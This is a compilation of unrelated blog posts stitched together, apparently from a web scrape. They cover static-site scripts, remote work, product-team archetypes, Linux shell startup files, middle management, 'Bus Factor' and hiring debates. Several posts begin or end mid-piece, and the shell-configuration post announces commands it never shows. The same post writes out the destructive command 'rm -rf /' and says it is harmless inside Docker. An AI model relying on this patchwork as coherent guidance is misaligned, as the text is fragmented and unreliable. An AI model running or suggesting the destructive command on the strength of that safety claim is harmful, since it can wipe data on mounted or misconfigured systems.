<p>At some point I checked <a href="https://gohugo.io/">hugo</a> since I overheard it was a good choice for making static sites. However configuration files scare me as well as having another server process active all the time. The git repo solution runs only on updates.</p>
<p>There is also <a href="https://mkws.sh/">mkws</a> which looks like a cool project, but I learned about it after being mostly done with the scripts.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I dunno, make stuff or something. Generating HTML is not <em>that</em> difficult so if the idea of making your own platform sounds appealing just go for it. Writing the scripts was somewhat fun even if I'm not a big fan of the POSIX shell syntax. In the end you might find a novel way to do a relatively simple thing and on its own that could be fun.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<p>I kinda hate myself for writing this post like a revelation in the times of pandemic and talking about remote work while it is <em>hot topic</em> . In reality, I have been working 100% remotely for more than 2 years (I previously worked for more than 8 years in the offices) and right now I feel I can tell my experiences about remote work and why I will probably never go back to a regular office job.</p>
<p>Around 2 years ago I got the offer to join MailerLite as a remote contractor. I was over-thinking whether I should start working remotely, what would it mean for me, my habits, social life, and my career progress. There were too many unknowns at that point as I have only done some freelance gigs remotely, but have been involved with distributed teams all over the world in previous companies. I took the red pill and my remote journey began.</p>
<p>All my doubts were cleared right away.</p>
<p>The first one - traffic. I hate the traffic in Belgrade. The city isn’t building its infrastructure (roads, bridges) as fast as it is growing and it is showing. On a good day, it took around 30 minutes of driving to work, which is not a problem. But, in the majority of days going to work and back home took on average 2 hours. I say 2 hours because you have to take into account that you have to find a parking space, probably 10 minutes from the office, and then walk to the office which all adds to 2 hours of lost time each day. If you calculate - it means that you are losing <strong>22 days per year</strong> in the traffic.</p>
<p>What could you do with that extra <em>time</em> that you have? I remember one analogy when I talked to one of my friends as he said: “It is like when people are telling that smokers could put all money they spend on cigarettes aside and can buy a new car after some time of saving. Then you see people who stopped smoking and after some time you don’t see them with a new car”. That wasn’t the case for me. I rediscovered hobbies that I have stopped practicing because of lack of time - started playing guitar more, recording new music, and most importantly, I had time to read more non-business related books. You can become dull and get into a work-home-sleep routine because of the lack of time.</p>
<p>Micromanagement was the other thing that I thought could happen in remote work. Fortunately, it didn’t. It is just a matter if you trust your employees or not. If you don’t trust your employees, you either didn’t hire the right people for your company or you are suffering from trust issues and adapting to the situation. Usually, it is the second thing. People who slack off because there aren’t any measures of control because they are working remotely show their faces and bad habits really fast and you can easily filter them.</p>
<p>When working remotely, <strong>you are your own manager</strong>. You must plan your time and goals, and how much you give yourself to work. Not too little and not too much, balance, as always, is the key.</p>
<p>There are so many tools to make communication while working remotely easy. We utilize Slack, have regular calls on Zoom, write our monthly feedback on 15five, and much more. If we need to brainstorm, we get on a video call or write in Slack.</p>
<p>There is one potential downside of working remotely for one target group - junior engineers. I will explain why I don’t think it is a rule but purely depends on the person. While junior engineers can always sit next to their mentors in a regular office job, here it is a bit different. Your company has to have really good documentation and processes so they don’t get lost. But, on the other hand, at MailerLite we are always looking for persons that are “self-starters” and can pick-up things themselves without or with minimal interference from other colleagues. In my experience, juniors can struggle at the beginning for the first (half of) year, but after that, they are usually stronger with knowledge and work ethics than juniors in regular offices. They are more independent in work and can easily learn new things and implement them.</p>
<p>The key thing in remote work is overcommunication. I can’t stress enough how much it is important. As a pitfall of remote work, you must write and overshare because there is no such thing as over-communication. Why do we do that? We are a remote-first company, but we have an office in Vilnius if someone wants to work from it. A couple of people are working from the office, but as I have been there a couple of times it is the most silent office I have ever been in. The communication is done via Slack or conference calls with everyone, so no one is left out, as this can be a problem when you have a combination of office and remote work in your company.</p>
<p>Productivity, personally, is sky-rocketing once I switched to the remote. I get at least 50% more stuff done as there are no distractions, unnecessary small-talks, listening to office gossips, braggings, and other things that can happen in the office.</p>
<p>Freedom is also an important thing. Sometimes I have to do something personal in the morning, or the middle of the day. Sometimes, I can go to the gym during the day and go back refreshed and start working. I can go to my hometown when I want to and work from there. I can travel wherever I want and work from there. I have become more social as I have more time for my friends and family and am less stressed. No one is looking at how much time you are spending working - but if you did the task or not which is the only important thing.</p>
<p>The biggest indicator that remote work is a benefit for both an employee and the company is that Microsoft and Google are now permanently remote if you want to. Pandemic nudged them in that direction, but they have seen the benefits and adapted.</p>
<p>Times are changing. Gosh, what a cliche sentence. <strong>Times are always changing, it is up to us if we want to adapt</strong>. Remote work has been around for a long time, but most of the companies resisted the change. I’m happy that companies are now forced to change because it requires a change of mindset, but there is a quote from my favourite TV series of all time, Twin Peaks, <em>“There’s some fear in letting go”</em>.</p>

<p>This is going to be a short walk in the product development zoo, I hope you’ll enjoy the ride!</p>
<p><em>Caveat</em>: what you’ll read about are (usually) not personality types but behaviors in a specific (type of) situation. Acting like a HIPPO, a WOLF, a RHINO or a ZEBRA doesn’t make anyone a bad person. You’re still a team, aim to understand where they are coming from, and, well, they might even be right, with the wrong communication style. </p>

<p>It can be tempting to give in to the HIPPOs – founders or CEO or VPS who want to make all the decisions – but don’t let them steer you off course.</p>
<p>Bring everything back to your vision and objectives. If the HIPPOs aren’t aligned with those, you could be headed for dangerous waters.</p>
<p>Don’t let your HiPPO kill your ideas – inform them with data and make them a <a href="https://www.forbes.com/sites/bernardmarr/2017/10/26/data-driven-decision-making-beware-of-the-hippo-effect/" target="_blank" rel="noopener">Data-driven HiPPO</a>! </p>

<h2>The WOLF – Working On the Latest Fire</h2>

<p>The WOLF has a short attention span and a temptation to jump from one problem to the next. They tend to only enjoy fighting fires, This will disrupt your team’s focus and effectiveness, making you easy prey for your competitors.</p>
<p>Create a process for collecting feedback about problems, bugs and only consider these along with all other requests. Set up triaging and set clear priorities and a method for prioritization.</p>

<p>The RHINO is just there to collect a paycheck without contributing much to the team. They might not be actively impeding your decision-making, but they are not helping much either. </p>
<p>Having a clearly defined prioritization process can help ensure all your team members understand how decisions are made and give them the confidence to actively participate. Hopefully, in this process, everyone is empowered to have a say and it doesn’t turn into “Well our process is that the boss tells you what’s important” – which is exactly how you end up with a team of disillusioned RHINOs.</p>

<p>ZEBRAs think they know it all but rely on their instinct rather than any actual evidence. To stave off the ZEBRAs in your midst, make sure that you’ve got data to back up your decisions.</p>
<p>Come up with quick experiments you can run to test ideas and gather evidence. Push for a data-driven culture.</p>

<h2>And one extra…. the RHINO again! This time, Really High value New Opportunity</h2>
<p>Usually, it’s a salesperson with an amazing value customer deal for an unplanned feature insisting re-allocating resources to build what’s required to win the deal. The results, sadly, are an ignored strategy and roadmap and resources allocated to serve a single customer.</p>
<p>There are two ways here:</p>
<p>1, Chase the RHINO away: Compare the opportunity cost and value and argue against signing the deal if you have customer insight supporting the roadmap.<br>2, Tame the RHINO: Adjust the roadmap if the opportunity includes features you already had planned for later in the year.</p>

      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I remotely login to some Linux computers or use Docker containers, I would find the shell is plain black and white, different from the colorful shell I am used to dealing with on my local machine. This sometimes makes it difficult to look for libraries, executables, and folders. Sometimes, some executables could be called directly from a local shell but from a remote login shell they are not directly callable.</p>



<p>It turns out that the shell is an executable and it is “configured” by special shell scripts such as <code>~/.bashrc</code>, <code>~/.profile</code>, <code>~/.bash_profile</code>. In this blog post, I would like to briefly discuss the differences between these scripts.</p>

<h3 id="bashrc">~/.bashrc</h3>

<p>I modify the <code>~/.bashrc</code> file from time to time, because sometimes I would like to set some environment variables, including <code>PATH</code> which is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search when looking for executable files. But I have been ignoring the commented block at its beginning for decades.</p>

<div><div><pre><code>$ cat ~/.bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
...
</code></pre></div></div>

<p>This means that in a local shell where <code>bash</code> is being used, this shell script will be executed immediately after <code>bash</code> is executed. There are many other shell executable variants, such as <code>zsh</code>. <code>~/.bashrc</code> is only specific to <code>bash</code>.</p>



<p>There are many settings in the <code>~/.bashrc</code> that makes the shell look colorful. For example,</p>

<div><div><pre><code># enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
</code></pre></div></div>

<h3 id="profile">~/.profile</h3>

<p>The comment block found in the <code>~/.profile</code> explicitly tells us that it will be executed for the login shells. However, if <code>~/.bash_profile</code> or <code>~/.bash_login</code> exists, <code>~/.profile</code> will not be executed.</p>

<div><div><pre><code>$ cat ~/.profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
</code></pre></div></div>

<p>The default content of the <code>~/.profile</code> is simple. In most cases, it inherits whatever is in the <code>~/.bashrc</code>, and adds some user specific executable filepath to the environment variable <code>PATH</code>. So if there are commands that make the shell look colorful in the <code>~/.bashrc</code>, the login shell should also look colorful.</p>

<h3 id="bash_profile">~/.bash_profile</h3>

<p>Unfortunately, in most of my login trials, the shells were never colorful, and sometimes the environment variables did not match my expectation. In those cases, this is because there exists a <code>~/.bash_profile</code> and therefore <code>~/.profile</code> or <code>~/.bashrc</code> is never executed. Usually the <code>~/.bash_profile</code> will be empty, which means that we would not have the environment and appearance that we have in our local shell.</p>



<p>To make the login shell “back to normal”, we could either delete the <code>~/.bash_profile</code> or modify the <code>~/.bash_profile</code> by adding some commands like</p>



<h3 id="caveats">Caveats</h3>

<p>Sometimes, a non-color shell could be helpful. It can be used to indicate that you are not working in local shell, and that what you are seeing could either be a Docker shell or a remote login shell. When we know what shell we are dealing with, we will be more likely to avoid dangerous operations. For example, in a Docker shell, we could do almost anything, such as <code>rm -rf /</code> without sudo, without harming the local system.</p>

<h3 id="acknowledgement">Acknowledgement</h3>

<p>I would like to thank Liam Keane from Hacker News for correcting the grammars and polishing the words in the blog post.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>You’re a developer working on the Foobar feature at company X. Unbeknownst to you, Genghis, the company CEO, just had dinner with other industry leaders and became excited about this new thing called Beezlyboo. Genghis mentions his excitement at Thursday’s executive council meeting, with the company’s top layer of middle management listening in.</p><p>Mandukhai, the middle manager two layers above you, was present. She conveys the takeaways in her regular Friday morning coffee catchup with the managers that report to her, including the Foobar team lead, your boss, Subotai.</p><p>Fighting for relevance after a bumpy year, Subotai grows convinced that working on this Beezlyboo thing might be his ticket back into Mandukhai's good graces.</p><p>You enter the office on Monday morning, unsheathe your sword, and balance it carefully on top of your monitor before sitting down and getting to work. <i>Little do you know that two weeks from now, half your time will be spent on this new thing called Beezlyboo.</i></p><div><h3>How Middle Management Emerges</h3><p>This is an unfortunately common description of how decisions are made in many of today’s <del>Khanates</del> companies. Why is that? Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage. We assume that reporting edges correspond to lines of communication and that members of a team are fully connected in complete graphs.</p></div></d-figure></figure><p>The benefits are clear. When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai. By concentrating ownership of Foobar in Subotai’s hands, his team is shielded from unnecessary communication, allowing them to focus on their work.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>To illustrate: <span><span><span><math><semantics><mrow><msub><mi>K</mi><mrow><mn>5</mn><mn>0</mn><mn>0</mn><mn>0</mn></mrow></msub><mo>=</mo><mn>1</mn><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mn>9</mn><mn>7</mn><mo separator="true">,</mo><mn>5</mn><mn>0</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">K_{5000} = 12,497,500</annotation></semantics></math></span></span></span>, but introducing 556 managers<sup>1</sup> each with <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>=</mo><mn>1</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">m(i) = 10</annotation></semantics></math></span></span></span> reports gives <span><span><span><math><semantics><mrow><msub><mi>M</mi><mrow><mn>5</mn><mn>5</mn><mn>6</mn></mrow></msub><mo>=</mo><mn>3</mn><mn>0</mn><mo separator="true">,</mo><mn>5</mn><mn>8</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">M_{556} = 30,580</annotation></semantics></math></span></span></span>.

While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China. Maybe our team building activities are a little boring, and we do like a good reorg, especially after we invade acquire a new company, but what are you proposing? That we fire all our generals and officers and turn into those Valve hippies? <br><b>Ogedei (You):</b> Not at all.

You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<sup>2</sup> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad. The way we organize ourselves in companies will change because young people like me communicate in new and different ways.</p><p>The first wave of startups attempting to tackle this — like <a href="https://knowyourteam.com/">Know Your Team (KYT)</a>, <a href="https://www.ally.io/">Ally</a>, <a href="https://lattice.com/">Lattice</a>, <a href="https://www.donut.com/">Donut</a>, <a href="https://withcadence.io/">Cadence</a>, and a handful of others — are already well on their way.</p><p>Let's take KYT as an example.

Backed by years of research and a kick-ass CEO in <a href="https://clairelew.com/">Claire Lew</a>, KYT is a great example of a company pushing the envelope of how we think about management.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><div><p>If middle managers in today’s corporations are obsessed with airport books and ways of organizing people, then the true organizational geeks are military commanders and theorists.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>A friend at a prominent tech company took last month off using their new covid policy. When he got back to work last week, he was horrified. Not to see that things had fallen apart in his absence, but to realize that they hadn’t. Overwhelmingly, life without him had continued as normal.</p>
<p>This is not a coincidence. A company dependent on a single person’s work has a single point of failure. In tech jargon, they have low Bus Factor, the number of people who would have to get hit by a bus for the project to fail. The higher your Bus Factor, the greater your institutional resilience.</p>
<p>But it’s hard to reconcile this experience with faith in an impactful career. If a firing squad executes a prisoner, we can say that each shooter is sufficient but not necessary. The success of the project depends on the shooters in aggregate, but not on any person in particular.</p>
<p>It’s easy to understand why an organization might want this kind of redundancy. Sure, it’s wasteful and inefficient, but it prevents the greatest threat to any company: giving employees leverage.</p>
<h3 id="The-Misery-of-Redundancy"><a href="#The-Misery-of-Redundancy" title="The Misery of Redundancy"></a>The Misery of Redundancy</h3><p>If you’re reading this, you’re probably well versed on sublinear returns to headcount. You know about the Mythical Man-Month, and understand that communication scales quadratically. You shudder at the thought of growing complexity.</p>
<p>But the untold story isn’t about efficiency, it’s about negative returns to engagement. One person on a project is personally responsible. Two people might manage to coordinate. Beyond that, you’re in the endless hellscape of team projects.</p>
<p>Remember the last time you were assigned partners in school? A team project is a game of chicken. Each participant signals their willingness to fail through procrastination, until finally at the last minute someone defects and does all the work. The more you care, the more you lose.</p>
<p>(At least those projects ended. As a friend once put it, the weirdest thing about working at large companies is that you’ll wake up one morning, have a new teammate randomly assigned to you, and proceed to see them 8 hours a day every day until one of you quits or dies.)</p>
<p>This is the world of high Bus Factor. The greater a project’s supposed “resilience”, the more each person becomes dispensable. Sufficient, but not necessary.</p>
<p>(Even if you’re working in a mission-driven company, your job is meaningless unless you’re personally responsible for the success of that mission. The US Government might be the single more important organization in the world. How do you think it feels to work as an entry level bureaucrat?)</p>
<p>Have you ever wondered why you spend so much time writing design docs and detailed PRs? Or why you’re constantly stuck in meetings explaining what you do to various groups of people? Or why your project has a separate engineer, EM, PM, Designer and Tech Lead? Maybe these are best practices, maybe we’ve all settled on the right way of doing things.</p>
<p>But they’re also ways of making sure that if you get hit by a bus, no one has to care.</p>
<h3 id="Self-Reinforcing-Churn"><a href="#Self-Reinforcing-Churn" title="Self-Reinforcing Churn"></a>Self-Reinforcing Churn</h3><p>Every large tech company runs performance reviews twice a year. Don’t ask me why, it’s the way things have always been done.</p>
<p>Simultaneously, the average tenure at these companies hovers at around 2 years.</p>
<p>That means that at any given point, fully one quarter of your teammates are totally checked out.</p>
<p>On the high end, there are people who know they’re leaving in the next year, and just have absolutely no reason to care. If you’re at the beginning of a new review cycle, you’re 6 months away from getting PIP’d, which means you’re 12 months away from getting fired.</p>
<p>Odds are, you’re going to lose the game of chicken. You might not have the most to lose, but unless you’re also quitting next cycle, you certainly don’t have the least.</p>
<p>For the employer, the upshot is that anyone can quit at any time. If you’re on a 12 person team, you might lose 3 people each half. The only viable response is to up the Bus Factor, layer on more redundancy, and limit the importance of each individual.</p>
<p>Of course, the irony is that it’s precisely this sense of replaceability that drives churn in the first place! The more employees are alienated, the more willing they are to leave as soon as their equity vests.</p>
<p>So this ends up being a vicious cycle where higher churn forces a higher Bus Factor, which causes alienation, which increases churn, and so on until you either die or become Oracle.</p>
<h3 id="Escaping-the-Labyrinth"><a href="#Escaping-the-Labyrinth" title="Escaping the Labyrinth"></a>Escaping the Labyrinth</h3><p>The flip side is that there’s still hope.</p>
<p>Since the cycle is self-reinforcing, we can break it in the middle and slay the ouroboros. There’s historical path dependence, but no fundamental reason we have to live this way.</p>
<p>The alternative to redundancy isn’t fragility, it’s personal responsibility. It’s keeping your Bus Factor low.</p>
<p>In this world, you can develop specific mastery instead of a broad assortment of skills. You can be a craftsman instead of a code monkey, understand systems deeply instead of cargo culting best practices.</p>
<p>Imagine working at a company where every single one of your coworkers gives a shit. Imagine knowing that your contributions are important, that the world is different because of your existence.</p>
<p>That’s Bus Factor 1.</p>
<p>As far as I can tell, this is basically how SpaceX works. It’s not a coincidence that they’re <a target="_blank" rel="noopener" href="https://www.payscale.com/data-packages/top-tech-companies-compared">ranked #1 for both stress and sense of meaning</a>. If you hear that employees are overworked and underpaid, don’t cry abuse, ask how they’re getting compensated instead.</p>
<h3 id="FAQ"><a href="#FAQ" title="FAQ"></a>FAQ</h3><p><strong>Why exactly does leverage even matter?</strong><br><em>A priori</em>, it shouldn’t. If all employees have leverage, there’s nothing to negotiate for. You could ask for more money, but everyone else could too, eventually the company falls apart and you all lose.</p>
<p>But <em>a posteriori</em>, we can work backwards from behavior. If companies are willing to sacrifice efficiency, that is itself evidence of exploitation.</p>
<p><strong>That sounds crazy. If engineers are actually underpaid, why don’t they just go somewhere else? Why doesn’t the market raise salaries?</strong><br>I’ve screened resumes from entry level engineers who claim to have saved their companies millions of dollars. The crazy part is that I believe it! If you can make even the smallest change to a ranking algorithm, or improve the performance of a costly computation, or run an experiment that marginally increases click-through rate, the effects multiply out across a huge user base.</p>
<p>And yet, I don’t know a single entry level engineer getting paid commensurately.</p>
<p>First, there’s a lack of counterfactual impact. Sure, you saved the company a million dollars, but if you didn’t take the job someone else would, and they would have done the same work.</p>
<p>Your impact looks huge, but in a high Bus Factor world, your actual impact is just the delta between your ability and the next best engineer. You might be able to negotiate another $10k, but not two orders of magnitude more.</p>
<p>Second, you don’t own the means of production. Your skills are only worth millions of dollars in the particular context of this company. You can’t walk away and produce that value on your own. You depend on the company much more than it depends on you.</p>
<p><strong>Hmm, maybe, but if firms have so much market power, why don’t they just keep Bus Factor low but set a strong precedent against adversarial negotiation?</strong><br>Great question. Since companies are good at internal coordination, and employees are bad at collective bargaining, firms ought to be able to keep salaries low even without increasing the Bus Factor.</p>
<p>You could just wait for someone to speak up, immediately fire them, take whatever financial hit comes from their project’s failure, but set the precedent for any future dissidents that negotiation is unacceptable.</p>
<p>The problem is, firms don’t handle negotiations, managers do, and their incentives are just as screwed up as yours. A manager stands to lose their career if too many projects fail, but it costs them nothing to advocate for your promotion. So in a low Bus Factor world, the tendency is always to default to generosity.</p>
<p>Why doesn’t this happen at SpaceX? Remember, none of this is actually about salaries or promotions, it’s about sociopathically pursuing leverage as an alternative to fulfilment when you have no other choices. This is all conditional on not being treated like a human, and not having a meaningful job.</p>
<p>In Bus Factor 1 world, you have too much personal responsibility to coast on momentum or free ride on a teammate’s accomplishments. More importantly, you might actually personally care.</p>
<p><strong>Wouldn’t running a company as Bus Factor 1 invite risk?</strong><br>Absolutely. SpaceX has blown up rockets. Tesla has missed deadlines. Neuralink is doing god knows what.</p>
<p>But management science, financial engineering and organizational design are filled with countless other methods for deferring risk.</p>
<p><strong>Okay fine, I’m sold, where do I sign up?</strong><br>Pretty much nowhere!</p>
<p>I’ve asked every friend, accepted every cold call from recruiters, and as far as I can tell, nearly no companies or even individual teams are run with Bus Factor 1. Again, maybe SpaceX, but I’m relaying that second hand.</p>
<p>If you find out, let me know. Or better yet, start it yourself and tell me!</p>

<article id="post-193">

	

	
	<div>
		
<p>Another day, another HackerNews discussion about hiring being broken. The most recent one I saw was triggered by <a href="https://blog.alinelerner.com/ive-been-an-engineer-and-a-recruiter-hiring-is-broken-heres-why-and-heres-what-it-should-be-like-instead/">a blog post</a> by the formidable Aline Lerner (disclaimer: Aline is a friend and we collaborated on a <a href="https://www.holloway.com/g/technical-recruiting-hiring/about">hiring book</a> last year). Now, I 100% agree that hiring is broken, and Aline’s post is really thoughtful. In fact, a lot of “hiring is broken” articles are thoughtful.</p>



<p>But the discussion threads are something else—they miss the point of the article. The discussion threads are even more broken than hiring. And they’re really repetitive. They always do contain grains of truth, but inevitably have us reaching conclusions that are simplistic, and in my opinion, create a pretty bad attitude in the tech industry.</p>



<p><strong>Conclusion #1: “Hiring sucks for candidates, but hiring managers can do what they want</strong>“</p>



<p>The truth is that hiring is hard for everyone. There’s no question about it. It’s hard for both candidates and for hiring managers. Sure, FAANGs and the startup-du-jour might have a leg up, but most people who are hiring are trying to hire at a non-FAANG, non-sexy company. If you’ve never done it, you should try it at some point in your career. It’s an <em>incredibly </em>humbling experience. Or, at the very least, find a friend who’s spent time on hiring, and ask them for their favorite battle story.</p>



<p>And yes, on the balance, power and information asymmetry work out in favor of the companies hiring. And that asymmetry is much larger with FAANGs. But even FAANGs have to invest a tremendous amount of time and energy into hiring. It’s not really easy for anyone. </p>



<p>Especially if you want to do it <em>well</em>. Ask any successful leader (entrepreneur, manager) what they spend most of their time on, and it’ll either involve a large chunk spent on hiring (if they appreciate the problem and give it the attention it deserves) or dealing with the consequences of bad hiring (if they don’t).</p>



<p><strong>Conclusion #2: “Hiring is a crap-shoot—it’s a roll of the dice</strong>“</p>



<p>I strongly disagree with this one. When writing the <a href="https://www.holloway.com/g/technical-recruiting-hiring">Holloway Guide to Technical Hiring and Recruiting</a>, I got to interview dozens of really thoughtful hiring managers and recruiters. They were really good at their jobs. And there were some common themes. They were thoughtful about every step of their process. They kept their process balanced and fair, holding a high bar but respecting candidates and their time. They didn’t chase the same pool of candidates everyone else was chasing—instead, they found non-traditional ways to discover really talented and motivated people who weren’t in the pool of usual suspects. They were thoughtful about what signals they were looking for and how best to assess them. And, they deeply understood their team’s needs, and candidates’ needs, and were really good at deciding when there was or wasn’t a fit. But most of all, they were effective: they built really talented teams.</p>



<p>There are a handful of companies that have built amazing hiring engines, and the proof is that they’ve been able to put together really strong teams. You can generally tell that if a person worked at a certain company at a certain time, that person is probably incredibly intelligent and incredibly motivated (some examples are Google, Facebook, Stripe, Dropbox at different points in time). There will always be noise. Even the best hiring managers will sometimes make hiring mistakes. And of course, even the best engineers may not be a fit for every role or every company. </p>



<p>Again, hiring is hard. But there is not a shred of doubt in my mind that if you are thoughtful about it, you can hire well. And really, you don’t need to be perfect at it. You just need to be better than the rest.</p>



<p><strong>Conclusion #3: “FAANGs suck at hiring”</strong></p>



<p>This one has some truth to it, but it’s a lot more subtle than “FAANGs suck at hiring”. Because let’s face it, they do hire really smart people. Some of the smartest people I know are at FAANGs right now. So let’s decouple that statement a little more.</p>



<p>FAANGs <em>do </em>suck at parts of hiring, like their candidate experience. They can be really slow at making hiring decisions. Their hiring process might be tedious and seem arbitrary. But <em>they usually can get away with it</em>, <em>and you probably can’t!</em> They’ve got a strong brand, interesting technical challenges (interesting for some people, at least), and a lot of money. In fact, one FAANG VP of Engineering told me: “our process is what we can get away with”. To the point that they can even play it off as a positive: “our process is slow and long because we are <em>very</em> selective”.</p>



